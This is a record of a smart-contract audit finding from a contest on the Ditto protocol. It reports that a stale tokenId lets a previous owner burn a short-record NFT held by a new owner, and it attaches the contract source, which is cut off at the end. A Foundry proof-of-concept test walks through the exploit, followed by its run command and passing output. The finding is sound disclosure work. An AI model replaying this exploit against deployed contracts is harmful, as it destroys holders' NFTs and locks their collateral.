{
  "Title": "Previous NFT owner can burn NFT from the new owner",
  "Content": "# Previous NFT owner can burn NFT from the new owner\n\n### Severity\nHigh Risk\n\n### Relevant GitHub Links\n<a data-meta=\"codehawks-github-link\" href=\"https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/libraries/LibShortRecord.sol#L132\">https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/libraries/LibShortRecord.sol#L132</a>\n\n\n## Summary\n\nShort records can be transferred as NFTs. Internally, the short record is deleted from the sender and re-created for the new owner (receiver). However, the `tokenId` of the deleted short record is not reset, allowing the previous NFT owner to burn the NFT from the new owner.\n\n## Vulnerability Details\n\nShort positions, i.e., short records, can be represented as an NFT (ERC-721) with a specific `tokenId`, storing the reference to the short record id in the `shortRecordId` property of the `nftMapping` mapping.\n\nSuch a short record can be transferred to another address by sending the NFT to the new owner. Internally, when transferring the ERC-721 token, the `transferShortRecord` function is called (e.g., [in line 162](https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/facets/ERC721Facet.sol#L162) of the `ERC721Facet.transferFrom` function).\n\nThe `transferShortRecord` function first validates if the short record is transferable (e.g., not flagged and not canceled) and then calls the `deleteShortRecord` function in line 132 to delete the short record from the `shortRecords` mapping. Thereafter, a new short record with the values of the transferred short record is created with the new owner as the shorter, and the `nftMapping` struct is updated accordingly.\n\n[contracts/libraries/LibShortRecord.sol#L132](https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/libraries/LibShortRecord.sol#L132)\n\n```solidity\n120: function transferShortRecord(\n121:     address asset,\n122:     address from,\n123:     address to,\n124:     uint40 tokenId,\n125:     STypes.NFT memory nft\n126: ) internal {\n127:     AppStorage storage s = appStorage();\n128:     STypes.ShortRecord storage short = s.shortRecords[asset][from][nft.shortRecordId];\n129:     if (short.status == SR.Cancelled) revert Errors.OriginalShortRecordCancelled();\n130:     if (short.flaggerId != 0) revert Errors.CannotTransferFlaggedShort();\n131:\n132: ‚ùå  deleteShortRecord(asset, from, nft.shortRecordId);\n133:\n134:     uint8 id = createShortRecord(\n135:         asset,\n136:         to,\n137:         SR.FullyFilled,\n138:         short.collateral,\n139:         short.ercDebt,\n140:         short.ercDebtRate,\n141:         short.zethYieldRate,\n142:         tokenId\n143:     );\n144:\n145:     if (id == Constants.SHORT_MAX_ID) {\n146:         revert Errors.ReceiverExceededShortRecordLimit();\n147:     }\n148:\n149:     s.nftMapping[tokenId].owner = to;\n150:     s.nftMapping[tokenId].shortRecordId = id;\n151: }\n```\n\nHowever, the [`LibShortRecord.deleteShortRecord`](https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/libraries/LibShortRecord.sol#L184-L225) function neglects to reset and delete the short record's `tokenId`, which is [initially set to the `tokenId` of the newly minted NFT in line of the `ERC721Facet.mintNFT` function](https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/facets/ERC721Facet.sol#L280). Consequently, upon transferring the short record, the deleted short record still references the transferred NFT's `tokenId`, in addition to the new short record which also references the same `tokenId`. Thus, two short records (with different owners), one being even deleted, reference the same NFT token.\n\nThis oversight leads to the following issues (with number 3 being the most severe):\n\n1. **The `ERC721Facet.balanceOf` function will report an incorrect NFT token balance for the previous NFT owner:** If the short record was only partially filled before transferring it as a NFT, the [remaining short record can still be fully filled](https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/facets/BidOrdersFacet.sol#L284-L294), resetting the `SR.Cancelled` status. This will cause the `balanceOf` function to include this short record, and due to the short record still referencing the transferred NFT's `tokenId`, this NFT is still counted as owned by the previous owner.\n2. **The previous NFT owner can not tokenize the remaining short record:** As the `tokenId` of the deleted short record is not reset, the previous owner can not tokenize the remaining short record as any attempt to mint a new NFT via the[ `ERC721Facet.mintNFT` function will revert with the `Errors.AlreadyMinted` error](https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/facets/ERC721Facet.sol#L272).\n3. **The previous NFT owner can burn the NFT from the new owner:** As the `tokenId` of the deleted and partially filled short record is not reset, the short can be fully filled, resetting the `SR.Cancelled` status. By subsequently combining this short with another short using the `ShortRecordFacet.combineShorts` function, the [combined shorts will have their associated NFT burned](https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/facets/ShortRecordFacet.sol#L168).\n\n   _Please note that the owner of the transferred short record can re-mint a NFT for the short via the `ERC721Facet.mintNFT`, but if the owner is a contract, the contract may lack the required functionality to do so._\n\nThe following test case demonstrates the outline issue 3 above:\n\n<details>\n  <summary><strong>Test case (click to reveal)</strong></summary>\n\n```solidity\nfunction test_ExploitNFT() public {\n    fundLimitBidOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, receiver);\n    fundLimitShortOpt(DEFAULT_PRICE, DEFAULT_AMOUNT * 2, sender);\n\n    assertEq(diamond.getShortRecords(asset, sender).length, 1);\n\n    vm.startPrank(sender);\n\n    assertEq(getShorts()[0].id, 101);\n    assertEq(getShorts()[0].shortRecordId, 2);\n    assertEq(getShorts()[0].price, DEFAULT_PRICE);\n    assertEq(getShorts()[0].ercAmount, DEFAULT_AMOUNT); // partially filled, 3 times DEFAULT_AMOUNT remaining\n\n    assertEq(diamond.balanceOf(sender), 0);\n    assertEq(diamond.getTokenId(), 1);\n\n    diamond.mintNFT(asset, Constants.SHORT_STARTING_ID);\n    diamond.setApprovalForAll(address(this), true);\n\n    assertEq(diamond.balanceOf(sender), 1);\n    assertEq(diamond.ownerOf(1), sender);\n\n    diamond.safeTransferFrom(sender, address(0xBEEF), 1, \"\");\n\n    assertEq(diamond.balanceOf(sender), 0); // NFT transferred, sender's balance is 0\n\n    fundLimitBidOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, receiver);\n\n    assertEq(diamond.balanceOf(sender), 1); // @audit-note balance is incorrectly 1 again\n\n    assertEq(diamond.getApproved(1), address(0));\n    assertEq(diamond.ownerOf(1), address(0xBEEF));\n    assertEq(diamond.balanceOf(address(0xBEEF)), 1);\n\n    fundLimitShortOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, sender); // new second short order\n    assertEq(getShorts()[0].ercAmount, DEFAULT_AMOUNT);\n\n    fundLimitBidOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, receiver);\n\n    assertEq(diamond.getShortRecordCount(asset, sender), 2); // Two existing shorts\n    assertEq(diamond.getShortRecords(asset, sender)[0].id, Constants.SHORT_STARTING_ID + 1);\n    assertTrue(diamond.getShortRecords(asset, sender)[0].status == SR.FullyFilled);\n    assertEq(diamond.getShortRecords(asset, sender)[1].id, Constants.SHORT_STARTING_ID);\n    assertTrue(diamond.getShortRecords(asset, sender)[1].status == SR.FullyFilled);\n\n    assertEq(diamond.getAssetUserStruct(asset, sender).shortRecordId, 4);\n\n    vm.startPrank(sender);\n    diamond.mintNFT(asset, Constants.SHORT_STARTING_ID + 1);\n    assertEq(diamond.balanceOf(sender), 2);\n\n    combineShorts({\n        id1: Constants.SHORT_STARTING_ID + 1,\n        id2: Constants.SHORT_STARTING_ID\n    });\n\n    assertEq(diamond.balanceOf(address(0xBEEF)), 0); // @audit-note 0xBEEF got its NFT burned!\n}\n```\n\n**How to run this test case:**\n\nCopy-paste the above Solidity test into the `test/ERC721Facet.t.sol` file (e.g., in line 500) and run with\n\n```bash\nforge test --match-test \"test_ExploitNFT\"\n```\n\n**Result:**\n\n```bash\nRunning 1 test for test/ERC721Facet.t.sol:ERC721Test\n[PASS] test_ExploitNFT() (gas: 1884650)\nTest result: ok. 1 passed; 0 failed; 0 skipped; finished in 55.71ms\n```\n\n</details>\n\n## Impact\n\nThe previous NFT owner can burn the NFT from the new owner.\n\nIf this NFT transfer was part of a trade and, for instance, sent to an escrow contract, the previous NFT owner can burn the NFT from the escrow contract, while the escrow contract lacks the functionality to re-mint the NFT for the short record. This renders the short record unusable, and funds (collateral) associated with the short record are lost.\n\n## Tools Used\n\nManual Review\n\n## Recommendations\n\nConsider resetting the `tokenId` of the deleted short record in the `LibShortRecord.deleteShortRecord` function.\n",
  "Impact": "HIGH",
  "Source": "https://www.codehawks.com/contests/clm871gl00001mp081mzjdlwc",
  "Code": [
    {
      "filename": "contracts/libraries/LibShortRecord.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0-only\npragma solidity 0.8.21;\n\nimport {U256, U88, U80} from \"contracts/libraries/PRBMathHelper.sol\";\n\nimport {STypes, SR} from \"contracts/libraries/DataTypes.sol\";\nimport {Errors} from \"contracts/libraries/Errors.sol\";\nimport {Events} from \"contracts/libraries/Events.sol\";\nimport {AppStorage, appStorage} from \"contracts/libraries/AppStorage.sol\";\nimport {Constants} from \"contracts/libraries/Constants.sol\";\nimport {LibAsset} from \"contracts/libraries/LibAsset.sol\";\nimport {LibOrders} from \"contracts/libraries/LibOrders.sol\";\nimport {LibOracle} from \"contracts/libraries/LibOracle.sol\";\n\n// import {console} from \"contracts/libraries/console.sol\";\n\nlibrary LibShortRecord {\n    using U256 for uint256;\n    using U88 for uint88;\n    using U80 for uint80;\n\n    function getCollateralRatio(STypes.ShortRecord memory short, address asset)\n        internal\n        view\n        returns (uint256 cRatio)\n    {\n        return short.collateral.div(short.ercDebt.mul(LibOracle.getPrice(asset)));\n    }\n\n    function getCollateralRatioSpotPrice(\n        STypes.ShortRecord memory short,\n        uint256 oraclePrice\n    ) internal pure returns (uint256 cRatio) {\n        return short.collateral.div(short.ercDebt.mul(oraclePrice));\n    }\n\n    /**\n     * @notice Returns number of active shortRecords\n     *\n     * @param asset The market that will be impacted\n     * @param shorter Shorter address\n     *\n     * @return shortRecordCount\n     */\n    function getShortRecordCount(address asset, address shorter)\n        internal\n        view\n        returns (uint256 shortRecordCount)\n    {\n        AppStorage storage s = appStorage();\n\n        // Retrieve first non-HEAD short\n        uint8 id = s.shortRecords[asset][shorter][Constants.HEAD].nextId;\n        if (id <= Constants.HEAD) {\n            return 0;\n        }\n\n        while (true) {\n            shortRecordCount++;\n            // One short of one shorter in this order book\n            STypes.ShortRecord storage currentShort = s.shortRecords[asset][shorter][id];\n            // Move to next short unless this is the last one\n            if (currentShort.nextId > Constants.HEAD) {\n                id = currentShort.nextId;\n            } else {\n                return shortRecordCount;\n            }\n        }\n    }\n\n    function createShortRecord(\n        address asset,\n        address shorter,\n        SR status,\n        uint88 collateral,\n        uint88 ercAmount,\n        uint64 ercDebtRate,\n        uint80 zethYieldRate,\n        uint40 tokenId\n    ) internal returns (uint8 id) {\n        AppStorage storage s = appStorage();\n\n        // ensure the tokenId can be downcasted to 40 bits\n        if (tokenId > type(uint40).max) revert Errors.InvalidTokenId();\n\n        uint8 nextId;\n        (id, nextId) = setShortRecordIds(asset, shorter);\n\n        if (id <= Constants.SHORT_MAX_ID) {\n            s.shortRecords[asset][shorter][id] = STypes.ShortRecord({\n                prevId: Constants.HEAD,\n                id: id,\n                nextId: nextId,\n                status: status,\n                collateral: collateral,\n                ercDebt: ercAmount,\n                ercDebtRate: ercDebtRate,\n                zethYieldRate: zethYieldRate,\n                flaggerId: 0,\n                tokenId: tokenId,\n                updatedAt: LibOrders.getOffsetTimeHours()\n            });\n            emit Events.CreateShortRecord(asset, shorter, id);\n        } else {\n            // All shortRecordIds used, combine into max shortRecordId\n            id = Constants.SHORT_MAX_ID;\n            fillShortRecord(\n                asset,\n                shorter,\n                id,\n                status,\n                collateral,\n                ercAmount,\n                ercDebtRate,\n                zethYieldRate\n            );\n        }\n    }\n\n    function transferShortRecord(\n        address asset,\n        address from,\n        address to,\n        uint40 tokenId,\n        STypes.NFT memory nft\n    ) internal {\n        AppStorage storage s = appStorage();\n        STypes.ShortRecord storage short = s.shortRecords[asset][from][nft.shortRecordId];\n        if (short.status == SR.Cancelled) revert Errors.OriginalShortRecordCancelled();\n        if (short.flaggerId != 0) revert Errors.CannotTransferFlaggedShort();\n\n        deleteShortRecord(asset, from, nft.shortRecordId);\n\n        uint8 id = createShortRecord(\n            asset,\n            to,\n            SR.FullyFilled,\n            short.collateral,\n            short.ercDebt,\n            short.ercDebtRate,\n            short.zethYieldRate,\n            tokenId\n        );\n\n        if (id == Constants.SHORT_MAX_ID) {\n            revert Errors.ReceiverExceededShortRecordLimit();\n        }\n\n        s.nftMapping[tokenId].owner = to;\n        s.nftMapping[tokenId].shortRecordId = id;\n    }\n\n    function fillShortRecord(\n        address asset,\n        address shorter,\n        uint8 shortId,\n        SR status,\n        uint88 collateral,\n        uint88 ercAmount,\n        uint256 ercDebtRate,\n        uint256 zethYieldRate\n    ) internal {\n        AppStorage storage s = appStorage();\n\n        uint256 ercDebtSocialized = ercAmount.mul(ercDebtRate);\n        uint256 yield = collateral.mul(zethYieldRate);\n\n        STypes.ShortRecord storage short = s.shortRecords[asset][shorter][shortId];\n        if (short.status == SR.Cancelled) {\n            short.ercDebt = short.collateral = 0;\n        }\n\n        short.status = status;\n        LibShortRecord.merge(\n            short,\n            ercAmount,\n            ercDebtSocialized,\n            collateral,\n            yield,\n            LibOrders.getOffsetTimeHours()\n        );\n    }\n\n    function deleteShortRecord(address asset, address shorter, uint8 id) internal {\n        AppStorage storage s = appStorage();\n\n        STypes.ShortRecord storage shortRecord = s.shortRecords[asset][shorter][id];\n        // Because of the onlyValidShortRecord modifier, only cancelShort can pass SR.Cancelled\n        // Don't recycle shortRecord id 254 so it can be used for all overflow uint8 ids\n        if (shortRecord.status != SR.PartialFill && id < Constants.SHORT_MAX_ID) {\n            // remove the links of ID in the market\n            // @dev (ID) is exiting, [ID] is inserted\n            // BEFORE: PREV <-> (ID) <-> NEXT\n            // AFTER : PREV <----------> NEXT\n            s.shortRecords[asset][shorter][shortRecord.prevId].nextId = shortRecord.nextId;\n            if (shortRecord.nextId != Constants.HEAD) {\n                s.shortRecords[asset][shorter][shortRecord.nextId].prevId =\n                    shortRecord.prevId;\n            }\n            // Make reuseable for future short records\n            uint8 prevHEAD = s.shortRecords[asset][shorter][Constants.HEAD].prevId;\n            s.shortRecords[asset][shorter][Constants.HEAD].prevId = id;\n            // Move the cancelled ID behind HEAD to re-use it\n            // note: C_IDs (cancelled ids) only need to point back (set prevId, can retain nextId)\n            // BEFORE: .. C_ID2 <- C_ID1 <--------- HEAD <-> ... [ID]\n            // AFTER1: .. C_ID2 <- C_ID1 <- [ID] <- HEAD <-> ...\n            if (prevHEAD > Constants.HEAD) {\n                shortRecord.prevId = prevHEAD;\n            } else {\n                // if this is the first ID cancelled\n                // HEAD.prevId needs to be HEAD\n                // and one of the cancelled id.prevID should point to HEAD\n                // BEFORE: HEAD <--------- HEAD <-> ... [ID]\n                // AFTER1: HEAD <- [ID] <- HEAD <-> ...\n                shortRecord.prevId = Constants.HEAD;\n            }\n\n            //Event for delete SR is emitted here and not at the top level because\n            //SR may be cancelled, but there might tied to an active short order\n            //The code above is hit when that SR id is ready for reuse\n            emit Events.DeleteShortRecord(asset, shorter, id);\n        }\n\n        shortRecord.status = SR.Cancelled;\n    }\n\n    function setShortRecordIds(address asset, address shorter)\n        private\n        returns (uint8 id, uint8 nextId)\n    {\n        AppStorage storage s = appStorage();\n\n        STypes.ShortRecord storage guard = s.shortRecords[asset][shorter][Constants.HEAD];\n        STypes.AssetUser storage AssetUser = s.assetUser[asset][shorter];\n        // Initialize HEAD in case of first short createShortRecord\n        if (AssetUser.shortRecordId == 0) {\n            AssetUser.shortRecordId = Constants.SHORT_STARTING_ID;\n            guard.prevId = Constants.HEAD;\n            guard.nextId = Constants.HEAD;\n        }\n        // BEFORE: HEAD <-> .. <-> PREV <--------------> NEXT\n        // AFTER1: HEAD <-> .. <-> PREV <-> (NEW ID) <-> NEXT\n        // place created short next to HEAD\n        nextId = guard.nextId;\n        uint8 canceledId = guard.prevId;\n        // @dev (ID) is exiting, [ID] is inserted\n        // in this case, the protocol re-uses (ID) and moves it to [ID]\n        // check if a previously closed short exists\n        if (canceledId > Constants.HEAD) {\n            // BEFORE: CancelledID <- (ID) <- HEAD <-> .. <-> PREV <----------> NEXT\n            // AFTER1: CancelledID <--------- HEAD <-> .. <-> PREV <-> [ID] <-> NEXT\n            uint8 prevCanceledId = s.shortRecords[asset][shorter][canceledId].prevId;\n            if (prevCanceledId > Constants.HEAD) {\n                guard.prevId = prevCanceledId;\n            } else {\n                // BEFORE: HEAD <- (ID) <- HEAD <-> .. <-> PREV <----------> NEXT\n                // AFTER1: HEAD <--------- HEAD <-> .. <-> PREV <-> [ID] <-> NEXT\n                guard.prevId = Constants.HEAD;\n            }\n            // re-use the previous order's id\n            id = canceledId;\n        } else {\n            // BEFORE: HEAD <-> .. <-> PREV <--------------> NEXT\n            // AFTER1: HEAD <-> .. <-> PREV <-> (NEW ID) <-> NEXT\n            // otherwise just increment to a new short record id\n            // and the short record grows in height/size\n            id = AssetUser.shortRecordId;\n            // Avoids overflow revert, prevents DOS on uint8\n            if (id < type(uint8).max) {\n                AssetUser.shortRecordId += 1;\n            } else {\n                // If max id reached, match into max shortRecordId\n                return (id, nextId);\n            }\n        }\n\n        if (nextId > Constants.HEAD) {\n            s.shortRecords[asset][shorter][nextId].prevId = id;\n        }\n        guard.nextId = id;\n    }\n\n    function updateErcDebt(address asset, address shorter, uint8 shortId) internal {\n        AppStorage storage s = appStorage();\n\n        STypes.ShortRecord storage short = s.shortRecords[asset][shorter][shortId];\n\n        // Distribute ercDebt\n        uint64 ercDebtRate = s.asset[asset].ercDebtRate;\n        uint88 ercDebt = short.ercDebt.mulU88(ercDebtRate - short.ercDebtRate);\n\n        if (ercDebt > 0) {\n            short.ercDebt += ercDebt;\n            short.ercDebtRate = ercDebtRate;\n        }\n    }\n\n    function updateErcDebt(STypes.ShortRecord storage short, address asset) internal {\n        AppStorage storage s = appStorage();\n\n        // Distribute ercDebt\n        uint64 ercDebtRate = s.asset[asset].ercDebtRate;\n        uint88 ercDebt = short.ercDebt.mulU88(ercDebtRate - short.ercDebtRate);\n\n        if (ercDebt > 0) {\n            short.ercDebt += ercDebt;\n            short.ercDebtRate = ercDebtRate;\n        }\n    }\n\n    function merge(\n        STypes.ShortRecord storage short,\n        uint88 ercDebt,\n        uint256 ercDebtSocialized,\n        uint88 collateral,\n        uint256 yield,\n        uint24 creationTime\n    ) internal {\n        // Resolve ercDebt\n        ercDebtSocialized += short.ercDebt.mul(short.ercDebtRate);\n        short.ercDebt += ercDebt;\n        short.ercDebtRate = ercDebtSocialized.divU64(short.ercDebt);\n        // Resolve zethCollateral\n        yield += short.collateral.mul(short.zethYieldRate);\n        short.collateral += collateral;\n        short.zethYieldRate = yield.divU80(short.collateral);\n        // Assign updatedAt\n        short.updatedAt = creationTime;\n    }\n\n    function disburseCollateral(\n        address asset,\n        address shorter,\n        uint88 collateral,\n        uint256 zethYieldRate,\n        uint24 updatedAt\n    ) internal {\n        AppStorage storage s = appStorage();\n\n        STypes.Asset storage Asset = s.asset[asset];\n        uint256 vault = Asset.vault;\n        STypes.Vault storage Vault = s.vault[vault];\n\n        Vault.zethCollateral -= collateral;\n        Asset.zethCollateral -= collateral;\n        // Distribute yield\n        uint88 yield = collateral.mulU88(Vault.zethYieldRate - zethYieldRate);\n        if (yield > 0) {\n            /*\n            @dev If somebody exits a short, gets margin called, decreases their collateral before YIELD_DELAY_HOURS duration is up,\n            they lose their yield to the TAPP\n            */\n            bool isNotRecentlyModified =\n                LibOrders.getOffsetTimeHours() - updatedAt > Constants.YIELD_DELAY_HOURS;\n            if (isNotRecentlyModified) {\n                s.vaultUser[vault][shorter].ethEscrowed += yield;\n            } else {\n                s.vaultUser[vault][address(this)].ethEscrowed += yield;\n            }\n        }\n    }\n\n    function burnNFT(uint256 tokenId) internal {\n        //@dev No need to check downcast tokenId because it is handled in function that calls burnNFT\n        AppStorage storage s = appStorage();\n        STypes.NFT storage nft = s.nftMapping[tokenId];\n        if (nft.owner == address(0)) revert Errors.NotMinted();\n        address asset = s.assetMapping[nft.assetId];\n        STypes.ShortRecord storage short =\n            s.shortRecords[asset][nft.owner][nft.shortRecordId];\n        delete s.nftMapping[tokenId];\n        delete s.getApproved[tokenId];\n        delete short.tokenId;\n        emit Events.Transfer(nft.owner, address(0), tokenId);\n    }\n\n    function setFlagger(\n        STypes.ShortRecord storage short,\n        address cusd,\n        uint16 flaggerHint\n    ) internal {\n        AppStorage storage s = appStorage();\n        STypes.AssetUser storage flagStorage = s.assetUser[cusd][msg.sender];\n\n        //@dev Whenever a new flagger flags, use the flaggerIdCounter.\n        if (flagStorage.g_flaggerId == 0) {\n            address flaggerToReplace = s.flagMapping[flaggerHint];\n\n            uint256 timeDiff = flaggerToReplace != address(0)\n                ? LibOrders.getOffsetTimeHours()\n                    - s.assetUser[cusd][flaggerToReplace].g_updatedAt\n                : 0;\n            //@dev re-use an inactive flaggerId\n            if (timeDiff > LibAsset.firstLiquidationTime(cusd)) {\n                delete s.assetUser[cusd][flaggerToReplace].g_flaggerId;\n                short.flaggerId = flagStorage.g_flaggerId = flaggerHint;\n            } else if (s.flaggerIdCounter < type(uint16).max) {\n                //@dev generate brand new flaggerId\n                short.flaggerId = flagStorage.g_flaggerId = s.flaggerIdCounter;\n                s.flaggerIdCounter++;\n            } else {\n                revert Errors.InvalidFlaggerHint();\n            }\n            s.flagMapping[short.flaggerId] = msg.sender;\n        } else {\n            //@dev re-use flaggerId if flagger has an existing one\n            short.flaggerId = flagStorage.g_flaggerId;\n        }\n        short.updatedAt = flagStorage.g_updatedAt = LibOrders.getOffsetTimeHours();\n    }\n\n    //@dev reset flag info if new cratio is above primaryLiquidationCR\n    function maybeResetFlag(STypes.ShortRecord storage short, address asset) internal {\n        if (short.flaggerId != 0) {\n            if (\n                LibShortRecord.getCollateralRatio(short, asset)\n                    >= LibAsset.primaryLiquidationCR(asset)\n            ) {\n                LibShortRecord.resetFlag(short);\n            }\n        }\n    }\n\n    function resetFlag(STypes.ShortRecord storage shortRecord) internal {\n        delete shortRecord.flaggerId;\n        shortRecord.updatedAt = LibOrders.getOffsetTimeHours();\n    }\n}"
    },
    {
      "filename": "contracts/facets/ERC721Facet.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0-only\npragma solidity 0.8.21;\n\nimport {IERC721} from \"@openzeppelin/contracts/token/ERC721/IERC721.sol\";\nimport {IERC721Receiver} from \"@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol\";\n\nimport {IDiamond} from \"interfaces/IDiamond.sol\";\nimport {Constants} from \"contracts/libraries/Constants.sol\";\nimport {Events} from \"contracts/libraries/Events.sol\";\nimport {Errors} from \"contracts/libraries/Errors.sol\";\nimport {STypes} from \"contracts/libraries/DataTypes.sol\";\nimport {Modifiers} from \"contracts/libraries/AppStorage.sol\";\nimport {LibDiamond} from \"contracts/libraries/LibDiamond.sol\";\nimport {LibShortRecord} from \"contracts/libraries/LibShortRecord.sol\";\n\n// import {console} from \"contracts/libraries/console.sol\";\n\ncontract ERC721Facet is Modifiers, IERC721 {\n    /**\n     * @dev Returns the number of tokens in ``owner``'s account.\n     */\n    function balanceOf(address owner) external view returns (uint256 balance) {\n        if (owner == address(0)) {\n            revert Errors.ERC721InvalidOwner(address(0));\n        }\n\n        uint256 length = s.assets.length;\n        for (uint256 i; i < length;) {\n            STypes.ShortRecord[] memory shortRecords =\n                IDiamond(payable(address(this))).getShortRecords(s.assets[i], owner);\n            for (uint256 j; j < shortRecords.length;) {\n                if (shortRecords[j].tokenId != 0) {\n                    balance++;\n                }\n                unchecked {\n                    j++;\n                }\n            }\n            unchecked {\n                ++i;\n            }\n        }\n    }\n\n    /**\n     * @dev Returns whether `tokenId` exists.\n     *\n     * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.\n     *\n     * Tokens start existing when they are minted (`_mint`),\n     * and stop existing when they are burned (`_burn`).\n     */\n    function _exists(uint256 tokenId) internal view virtual returns (bool) {\n        return _ownerOf(tokenId) != address(0);\n    }\n\n    /**\n     * @dev Returns the owner of the `tokenId`. Does NOT revert if token doesn't exist\n     */\n    function _ownerOf(uint256 tokenId) internal view virtual returns (address) {\n        return s.nftMapping[tokenId].owner;\n    }\n\n    /**\n     * @dev Returns the owner of the `tokenId` token.\n     *\n     * Requirements:\n     *\n     * - `tokenId` must exist.\n     */\n    function ownerOf(uint256 tokenId) public view virtual returns (address) {\n        address owner = _ownerOf(tokenId);\n        if (owner == address(0)) {\n            revert Errors.ERC721NonexistentToken(tokenId);\n        }\n        return owner;\n    }\n\n    /**\n     * @dev Safely transfers `tokenId` token from `from` to `to`.\n     *\n     * Requirements:\n     *\n     * - `from` cannot be the zero address.\n     * - `to` cannot be the zero address.\n     * - `tokenId` token must exist and be owned by `from`.\n     * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.\n     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.\n     *\n     * Emits a {Transfer} event.\n     */\n\n    function safeTransferFrom(address from, address to, uint256 tokenId) public virtual {\n        safeTransferFrom(from, to, tokenId, \"\");\n    }\n\n    /**\n     * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients\n     * are aware of the ERC721 protocol to prevent tokens from being forever locked.\n     *\n     * Requirements:\n     *\n     * - `from` cannot be the zero address.\n     * - `to` cannot be the zero address.\n     * - `tokenId` token must exist and be owned by `from`.\n     * - If the caller is not `from`, it must have been allowed to move this token by either {approve} or {setApprovalForAll}.\n     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.\n     *\n     * Emits a {Transfer} event.\n     */\n\n    function safeTransferFrom(\n        address from,\n        address to,\n        uint256 tokenId,\n        bytes memory data\n    ) public virtual {\n        transferFrom(from, to, tokenId);\n\n        if (!_checkOnERC721Received(from, to, tokenId, data)) {\n            revert Errors.ERC721InvalidReceiver(to);\n        }\n    }\n\n    /**\n     * @dev Transfers `tokenId` token from `from` to `to`.\n     *\n     * WARNING: Note that the caller is responsible to confirm that the recipient is capable of receiving ERC721\n     * or else they may be permanently lost. Usage of {safeTransferFrom} prevents loss, though the caller must\n     * understand this adds an external call which potentially creates a reentrancy vulnerability.\n     *\n     * Requirements:\n     *\n     * - `from` cannot be the zero address.\n     * - `to` cannot be the zero address.\n     * - `tokenId` token must be owned by `from`.\n     * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transferFrom(address from, address to, uint256 tokenId) public {\n        // @dev ensure the tokenId can be downcasted to 40 bits\n        if (tokenId > type(uint40).max) revert Errors.InvalidTokenId();\n\n        if (\n            msg.sender != from && !s.isApprovedForAll[from][msg.sender]\n                && msg.sender != s.getApproved[tokenId]\n        ) revert Errors.ERC721InsufficientApproval(msg.sender, tokenId);\n\n        address owner = ownerOf(tokenId);\n        if (owner != from) {\n            revert Errors.ERC721IncorrectOwner(from, tokenId, owner);\n        }\n        if (to == address(0)) {\n            revert Errors.ERC721InvalidReceiver(address(0));\n        }\n\n        STypes.NFT memory nft = s.nftMapping[tokenId];\n        address asset = s.assetMapping[nft.assetId];\n\n        //@dev If NFT does not exist, ERC721NonexistentToken() will trigger\n        LibShortRecord.transferShortRecord(asset, from, to, uint40(tokenId), nft);\n\n        delete s.getApproved[tokenId];\n\n        emit Events.Transfer(from, to, tokenId);\n    }\n\n    /**\n     * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.\n     *\n     * See {setApprovalForAll}\n     */\n    function isApprovedForAll(address owner, address operator)\n        public\n        view\n        returns (bool)\n    {\n        return s.isApprovedForAll[owner][operator];\n    }\n\n    /**\n     * @dev Gives permission to `to` to transfer `tokenId` token to another account.\n     * The approval is cleared when the token is transferred.\n     *\n     * Only a single account can be approved at a time, so approving the zero address clears previous approvals.\n     *\n     * Requirements:\n     *\n     * - The caller must own the token or be an approved operator.\n     * - `tokenId` must exist.\n     *\n     * Emits an {Approval} event.\n     */\n    function approve(address to, uint256 tokenId) external {\n        // @dev ensure the tokenId can be downcasted to 40 bits\n        if (tokenId > type(uint40).max) revert Errors.InvalidTokenId();\n        address owner = _ownerOf(tokenId);\n\n        if (to == owner) {\n            revert Errors.ERC721InvalidOperator(owner);\n        }\n\n        if (msg.sender != owner && !isApprovedForAll(owner, msg.sender)) {\n            revert Errors.ERC721InvalidApprover(msg.sender);\n        }\n\n        s.getApproved[tokenId] = to;\n\n        emit Events.Approval(owner, to, tokenId);\n    }\n\n    /**\n     * @dev Approve or remove `operator` as an operator for the caller.\n     * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.\n     *\n     * Requirements:\n     *\n     * - The `operator` cannot be the caller.\n     *\n     * Emits an {ApprovalForAll} event.\n     */\n    function setApprovalForAll(address operator, bool approved) external {\n        if (msg.sender == operator) {\n            revert Errors.ERC721InvalidOperator(msg.sender);\n        }\n        s.isApprovedForAll[msg.sender][operator] = approved;\n        emit Events.ApprovalForAll(msg.sender, operator, approved);\n    }\n\n    /**\n     * @dev Reverts if the `tokenId` has not been minted yet.\n     */\n    function _requireMinted(uint256 tokenId) internal view virtual {\n        if (!_exists(tokenId)) {\n            revert Errors.ERC721NonexistentToken(tokenId);\n        }\n    }\n\n    /**\n     * @dev Returns the account approved for `tokenId` token.\n     *\n     * Requirements:\n     *\n     * - `tokenId` must exist.\n     */\n    function getApproved(uint256 tokenId) external view returns (address operator) {\n        _requireMinted(tokenId);\n        return s.getApproved[tokenId];\n    }\n\n    /**\n     * @notice Mints NFT for active shortRecord\n     * @dev Minters can only mint their own 